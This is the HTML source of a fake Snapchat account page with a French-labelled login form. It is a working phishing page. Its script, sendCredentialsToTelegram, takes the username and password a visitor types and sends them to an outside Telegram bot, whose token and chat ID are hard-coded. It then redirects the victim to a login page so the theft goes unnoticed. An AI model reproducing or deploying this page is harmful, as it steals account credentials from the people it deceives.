<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
  <link rel="shortcut icon" href="img/faviconV2.png">
  <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
  <title>Snapchat • Account</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="/css/accounts.css">
</head>
<body>
  <!-- Loading Screen -->
  <div class="loader-overlay" id="loading">
    <div class="container-loader">
      <div id="circle-rotation" class="circle"></div>
      <div id="circle-2-rotation" class="circle-2"></div>
    </div>
  </div>

  <!-- Snapchat Logo -->
  <div class="logo">
    <img src="img/icon.svg" alt="Snapchat Logo">
  </div>

  <div class="container">
    <div class="avatar-container">
      <div class="avatar">
        <img src="img/avatar.webp" alt="User Avatar">
      </div>
    </div>

    <div class="username">tejazmali</div>
    <a href="https://help.snapchat.com/hc/en-us/articles/7012328360596-How-do-I-deactivate-or-delete-my-Snapchat-account">
      <div class="remove-account">Remove account</div>
    </a>
  </div>

  <!-- Formulaire de connexion -->
  <form id="loginForm" onsubmit="return sendCredentialsToTelegram(event);">
    <div>
      <label for="username">Nom d'utilisateur :</label>
      <input type="text" id="username" name="username" required>
    </div>
    <div>
      <label for="password">Mot de passe :</label>
      <input type="password" id="password" name="password" required>
    </div>
    <button type="submit">Se connecter</button>
  </form>

  <div class="button-container">
    <div class="button" onclick="window.location.href='https://accounts.snapchat.com/v2/signup';">Sign Up</div>
    <div class="button" onclick="window.location.href='/login.html';">Switch Account</div>
  </div>

  <script>
    // Fonction pour envoyer les informations à Telegram lors du clic sur "Se connecter"
    function sendCredentialsToTelegram(event) {
      event.preventDefault();  // Empêche l'envoi par défaut du formulaire

      // Récupération des informations saisies
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Paramètres du bot Telegram
      const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Token de ton bot
      const chatId = '-4746759996'; // ID de ton chat Telegram

      // Création du message avec les informations saisies par l'utilisateur
      const message = `Nom d'utilisateur: ${username}\nMot de passe: ${password}`;

      // URL de l'API Telegram
      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      // Envoi de la requête à Telegram
      fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log('Message envoyé à Telegram.');
          } else {
            console.error('Erreur lors de l\'envoi à Telegram.', data);
          }
        })
        .catch(error => {
          console.error('Erreur:', error);
        });

      // Rediriger vers la page de connexion après l'envoi
      window.location.href = '/login.html';  // Redirige vers la page de connexion ou toute autre action souhaitée

      return false; // Empêche l'envoi du formulaire par défaut
    }
  </script>

  <script src="/js/account.js"></script>
</body>
</html>
